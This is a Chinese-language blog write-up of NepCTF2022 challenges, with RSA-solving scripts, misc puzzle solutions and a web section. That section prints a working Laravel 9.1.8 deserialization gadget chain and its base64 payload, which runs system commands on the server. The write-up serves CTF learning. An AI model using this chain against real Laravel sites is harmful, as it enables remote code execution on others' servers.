@@ -1,0 +1,786 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-ctf," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言 Nep战队的招新赛，题目还是很有意思的，难度设计也比较合理，比赛质量还不错。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【NepCTF2022】write up">
+<meta property="og:url" content="http://example.com/2022/07/18/%E3%80%90NepCTF2022%E3%80%91write-up/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言 Nep战队的招新赛，题目还是很有意思的，难度设计也比较合理，比赛质量还不错。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.loli.net/2022/07/18/u28UlAar7F3mtV4.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/18/tdYQ32hLVJXFBCv.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/18/r19w4OpZRdEk8vn.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/18/uZfoCOEHiPS6s3F.jpg">
+<meta property="og:image" content="https://s2.loli.net/2022/07/18/ewGZig9N43SjPLu.png">
+<meta property="og:image" content="https://s2.loli.net/2022/07/18/p1wTtLbZnjymG82.jpg">
+<meta property="article:published_time" content="2022-07-18T01:29:02.000Z">
+<meta property="article:modified_time" content="2022-07-19T06:50:57.365Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/07/18/u28UlAar7F3mtV4.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/07/18/【NepCTF2022】write-up/"/>
+
+
+
+
+
+  <title>【NepCTF2022】write up | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/18/%E3%80%90NepCTF2022%E3%80%91write-up/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">【NepCTF2022】write up</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-07-18T09:29:02+08:00">
+                2022-07-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-up/" itemprop="url" rel="index">
+                    <span itemprop="name">write up</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>Nep战队的招新赛，题目还是很有意思的，难度设计也比较合理，比赛质量还不错。</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>分析加密脚本，p、q两数十分接近，用yafu做大整数分解。接下来发现本体给了c_mod_p和c_mod_d，根据描述这里用到了中国剩余定理来解出c，exp：<br>CRT.py：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">def Get_Mi(m_list, M):  # 获取所有的Mi</span><br><span class="line">    M_list = []</span><br><span class="line">    for mi in m_list:</span><br><span class="line">        M_list.append(M // mi)</span><br><span class="line">    return M_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Get_ei_list(M_list, m_list):  # 取所有的Mi的逆元</span><br><span class="line">    ei_list = []</span><br><span class="line">    for i in range(len(M_list)):</span><br><span class="line">        ei_list.append(Get_ei(M_list[i], m_list[i])[0])</span><br><span class="line">    return ei_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Get_ei(a, b):</span><br><span class="line">    # 计算ei</span><br><span class="line"></span><br><span class="line">    if 0 == b:</span><br><span class="line">        x = 1;</span><br><span class="line">        y = 0;</span><br><span class="line">        q = a</span><br><span class="line">        return x, y, q</span><br><span class="line">    xyq = Get_ei(b, a % b)</span><br><span class="line">    x = xyq[0];</span><br><span class="line">    y = xyq[1];</span><br><span class="line">    q = xyq[2]</span><br><span class="line">    temp = x;</span><br><span class="line">    x = y;</span><br><span class="line">    y = temp - a // b * y</span><br><span class="line">    return x, y, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def crt(a_list, m_list):</span><br><span class="line">    # 计算中国剩余定理，返回计算结果</span><br><span class="line">    M = 1  # M是所有mi的乘积</span><br><span class="line">    for mi in m_list:</span><br><span class="line">        M *= mi</span><br><span class="line">    Mi_list = Get_Mi(m_list, M)</span><br><span class="line">    Mi_inverse = Get_ei_list(Mi_list, m_list)</span><br><span class="line">    x = 0</span><br><span class="line">    for i in range(len(a_list)):  # 开始计算x</span><br><span class="line">        x += Mi_list[i] * Mi_inverse[i] * a_list[i]</span><br><span class="line">        x %= M</span><br><span class="line">    return x</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    a_list = list(map(int, input().split(&quot;,&quot;)))</span><br><span class="line">    m_list = list(map(int, input().split(&quot;,&quot;)))</span><br><span class="line">    print(crt(a_list, m_list))</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：<br><img src="https://s2.loli.net/2022/07/18/u28UlAar7F3mtV4.png"></p>
+<p>得到c的值后，p、q、c、e均已知，解RSA即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line"></span><br><span class="line">q =141264221379693044160345378758459195879285464451894666001807667429134348549398732060237738374405784248735752195059908618618110595213605790125890251970818437656069617772772793421437649079362238861287098916200835889507111259332056471215428085418047179545017193159169629731673653136069647622114441162534727202901</span><br><span class="line">p =141264221379693044160345378758459195879285464451894666001807667429134348549398732060237738374405784248735752195059908618618110595213605790125890251970818437656069617772772793421437649079362238861287098916200835889507111259332056471215428085418047179545017193159169629731673653136069647622114441162534727202891</span><br><span class="line">c =11585753035364453623378164545833713948934121662572481093551492504984285077422719062455876099192809170965528989978916297975142142402092047776685650391890015591851053625214326683661927557815767412532952834312578481775648269348260126890551800182341487341482624921905494384205411870866282984671167687789838745481283560185866063970417999748309023918055613674098243729965218609202078551918246640314724590879724609275497227193516782920583249761139685192331805838597293957173545581106446048233248746840771791319643962479707861560044363232580020690857525268858245122996322707454824806268698526881569554077998480289824923073346</span><br><span class="line">e = 65537</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line">d = libnum.invmod(e,phi)</span><br><span class="line">flag = libnum.n2s(pow(c,d,n))</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+<p>Flag：NepCTF{ju5t_d0_f4ct_4nd_crt_th3n_d3crypt}</p>
+<h2 id="中学数学"><a href="#中学数学" class="headerlink" title="中学数学"></a>中学数学</h2><p>分析加密代码，p与q的高150位是相同的，yafu直接分解比较困难，因此对这个大整数进行费马分解，exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line"></span><br><span class="line">c = 6253975396639688013947622483271226838902346034187241970785550830715516801386404802832796746428068354515287579293520381463797045055114065533348514688044281004266071342722261719304097175009672596062130939189624163728328429608123325223000160428261082507446604698345173189268359115612698883860396660563679801383563588818099088505120717238037463747828729693649297904035253985982099474025883550074375828799938384533606092448272306356003096283602697757642323962299153853559914553690456801745940925602411053578841756504799815771173679267389055390097241148454899265156705442028845650177138185876173539754631720573266723359186</span><br><span class="line">n = 13776679754786305830793674359562910178503525293501875259698297791987196248336062506951151345232816992904634767521007443634017633687862289928715870204388479258679577315915061740028494078672493226329115247979108035669870651598111762906959057540508657823948600824548819666985698501483261504641066030188603032714383272686110228221709062681957025702835354151145335986966796484545336983392388743498515384930244837403932600464428196236533563039992819408281355416477094656741439388971695931526610641826910750926961557362454734732247864647404836037293509009829775634926600458845832805085222154851310850740227722601054242115507</span><br><span class="line">e = 0x10001</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def factor(n):</span><br><span class="line">    a = gmpy2.iroot(n, 2)[0]</span><br><span class="line">    while 1:</span><br><span class="line">        B2 = pow(a, 2) - n</span><br><span class="line">        if gmpy2.is_square(B2):</span><br><span class="line">            b = gmpy2.iroot(B2, 2)[0]</span><br><span class="line">            p = a + b</span><br><span class="line">            q = a - b</span><br><span class="line">            return p, q</span><br><span class="line">        a += 1 </span><br><span class="line"> </span><br><span class="line">p,q=factor(n)</span><br><span class="line">f = (p - 1) * (q - 1)</span><br><span class="line">d = gmpy2.invert(e, f)</span><br><span class="line">print(long_to_bytes(pow(c, d, n)))</span><br></pre></td></tr></table></figure>
+<p>Flag：flag{never_ignore_basic_math}</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Just-Kidding"><a href="#Just-Kidding" class="headerlink" title="Just Kidding"></a>Just Kidding</h2><p>根据描述是Laravel，直播也提示了是最新的绕__wakeup()，所以直接找到链子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace Faker &#123;</span><br><span class="line">    class Generator &#123;</span><br><span class="line">        protected $providers = [];</span><br><span class="line">        protected $formatters = [];</span><br><span class="line">        function __construct() &#123;</span><br><span class="line">            $this-&gt;formatter = &quot;dispatch&quot;;</span><br><span class="line">            $this-&gt;formatters = 9999;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Illuminate\Broadcasting &#123;</span><br><span class="line">    class PendingBroadcast &#123;</span><br><span class="line">        public function __construct() &#123;</span><br><span class="line">            $this-&gt;event = &quot;cat /flag&quot;;</span><br><span class="line">            $this-&gt;events = new \Faker\Generator();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Symfony\Component\Mime\Part &#123;</span><br><span class="line">    abstract class AbstractPart &#123;</span><br><span class="line">        private $headers = null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class SMimePart extends AbstractPart &#123;</span><br><span class="line">        protected $_headers;</span><br><span class="line">        public $h3rmesk1t;</span><br><span class="line">        function __construct() &#123;</span><br><span class="line">            $this-&gt;_headers = [&quot;dispatch&quot;=&gt;&quot;system&quot;];</span><br><span class="line">            $this-&gt;h3rmesk1t = new \Illuminate\Broadcasting\PendingBroadcast();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">    $pop = new \Symfony\Component\Mime\Part\SMimePart();</span><br><span class="line">    $ser = preg_replace(&quot;/([^\&#123;]*\&#123;)(.*)(s:49.*)(\&#125;)/&quot;,&quot;\\1\\3\\2\\4&quot;,serialize($pop));</span><br><span class="line">    echo base64_encode(str_replace(&quot;i:9999&quot;,&quot;R:2&quot;,$ser));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>链子有4条，随便挑一挑就可以了：<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11362">Laravel 9.1.8 反序列化漏洞分析</a></p>
+<p>接下来找入口，看routes\web.php:<br><img src="https://s2.loli.net/2022/07/18/tdYQ32hLVJXFBCv.png"></p>
+<p>跟进到app\Http\Controllers\HelloController.php:<br><img src="https://s2.loli.net/2022/07/18/r19w4OpZRdEk8vn.png"></p>
+<p>找到入口为/hello,payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/hello?h3=TzozNzoiU3ltZm9ueVxDb21wb25lbnRcTWltZVxQYXJ0XFNNaW1lUGFydCI6Mzp7czo0OToiAFN5bWZvbnlcQ29tcG9uZW50XE1pbWVcUGFydFxBYnN0cmFjdFBhcnQAaGVhZGVycyI7TjtzOjExOiIAKgBfaGVhZGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fXM6OToiaDNybWVzazF0IjtPOjQwOiJJbGx1bWluYXRlXEJyb2FkY2FzdGluZ1xQZW5kaW5nQnJvYWRjYXN0IjoyOntzOjU6ImV2ZW50IjtzOjk6ImNhdCAvZmxhZyI7czo2OiJldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6Mzp7czoxMjoiACoAcHJvdmlkZXJzIjthOjA6e31zOjEzOiIAKgBmb3JtYXR0ZXJzIjtSOjI7czo5OiJmb3JtYXR0ZXIiO3M6ODoiZGlzcGF0Y2giO319fQ==</span><br></pre></td></tr></table></figure>
+
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="花花画画画花花"><a href="#花花画画画花花" class="headerlink" title="花花画画画花花"></a>花花画画画花花</h2><p>一个osz文件，osu玩家狂喜。直接下载谱面然后auto模式看谱，歌曲最后一段那部分他会把flag画给你看的。（画画还得是std模式）<br>Flag：NepCTF{MASTER_OF_坏女人！}</p>
+<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><h2 id="DCTris"><a href="#DCTris" class="headerlink" title="DCTris"></a>DCTris</h2><p>又一题游戏题，cdi文件，根据描述是世嘉DC的游戏，那就直接找模拟器，我找的是安卓的reicast。接下来根据描述，我们的分数要超过SHRT_MAX，也就是32767分。进游戏一看，打块，那就直接打。<br>打了快一小时后终于打过去了，发现原来被遮挡的地方出现了一个二维码：<br><img src="https://s2.loli.net/2022/07/18/uZfoCOEHiPS6s3F.jpg"></p>
+<p>拼接二维码并扫码即可获取flag：<br><img src="https://s2.loli.net/2022/07/18/ewGZig9N43SjPLu.png"><br>Flag：NepCTF{LetsPlayFallingBlocksGameOnDreamCast!}</p>
+<h2 id="少见的bbbbase"><a href="#少见的bbbbase" class="headerlink" title="少见的bbbbase"></a>少见的bbbbase</h2><p>Jpg文件，直接几个常用jpg文件隐写试试，最后发现是Jphide隐写，密码为空，提取出一个base码：<br>KkYWdvCQcLYewSUUy5TtQc9AMa<br>Base58解码得到flag<br>Flag：flag{Real_qiandao~}</p>
+<h2 id="9点直播"><a href="#9点直播" class="headerlink" title="9点直播"></a>9点直播</h2><p>直播间送flag<br>Flag：NepCTF{bad_woman_nb!}</p>
+<h2 id="馅饼？陷阱！"><a href="#馅饼？陷阱！" class="headerlink" title="馅饼？陷阱！"></a>馅饼？陷阱！</h2><p>经典osint，仔细观察图片，可以发现有一个皮卡的上面有一个琼字，范围缩小到海南省。然后我们又知道这个银行和如家酒店贴贴，因此直接去百度地图海南那一片搜索如家酒店，去查看街景，最后是不负众望，找到了是如家酒店(三亚湾店)：<br><img src="https://s2.loli.net/2022/07/18/p1wTtLbZnjymG82.jpg"></p>
+<p>银行名字是中国光大银行，搜索即可得到官网<br>Flag：NepCTF{<a target="_blank" rel="noopener" href="http://www.cebbank.com}/">www.cebbank.com}</a></p>
+<h2 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h2><p>填写问卷<br>Flag：NepCTF{see_you_NepCTF_2023}</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># -ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/07/16/%E3%80%90otterCTF2018%E3%80%91%E5%A4%8D%E7%9B%98write-up/" rel="next" title="【otterCTF2018】复盘write up">
+                <i class="fa fa-chevron-left"></i> 【otterCTF2018】复盘write up
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">81</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CRYPTO"><span class="nav-number"></span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#signin"><span class="nav-number">1.</span> <span class="nav-text">signin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%AD%E5%AD%A6%E6%95%B0%E5%AD%A6"><span class="nav-number">2.</span> <span class="nav-text">中学数学</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number"></span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Just-Kidding"><span class="nav-number">1.</span> <span class="nav-text">Just Kidding</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number"></span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8A%B1%E8%8A%B1%E7%94%BB%E7%94%BB%E7%94%BB%E8%8A%B1%E8%8A%B1"><span class="nav-number">1.</span> <span class="nav-text">花花画画画花花</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">签到题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DCTris"><span class="nav-number">3.</span> <span class="nav-text">DCTris</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%91%E8%A7%81%E7%9A%84bbbbase"><span class="nav-number">4.</span> <span class="nav-text">少见的bbbbase</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9%E7%82%B9%E7%9B%B4%E6%92%AD"><span class="nav-number">5.</span> <span class="nav-text">9点直播</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A6%85%E9%A5%BC%EF%BC%9F%E9%99%B7%E9%98%B1%EF%BC%81"><span class="nav-number">6.</span> <span class="nav-text">馅饼？陷阱！</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E5%8D%B7"><span class="nav-number">7.</span> <span class="nav-text">问卷</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
